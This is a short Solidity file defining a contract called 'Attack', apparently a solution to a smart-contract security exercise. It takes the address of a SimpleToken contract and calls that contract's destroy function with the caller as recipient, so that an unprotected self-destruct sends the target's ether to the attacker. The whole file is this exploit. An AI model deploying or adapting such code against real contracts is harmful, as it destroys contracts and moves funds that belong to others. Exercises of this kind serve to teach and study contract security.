pragma solidity 0.8.0;

import "/SimpleToken.sol";

contract Attack{
    address payable me ;
    SimpleToken instance;

    function attack(address payable originalContract) public {
        me = payable(msg.sender);
        instance = SimpleToken(originalContract);
        instance.destroy(me);
    }
}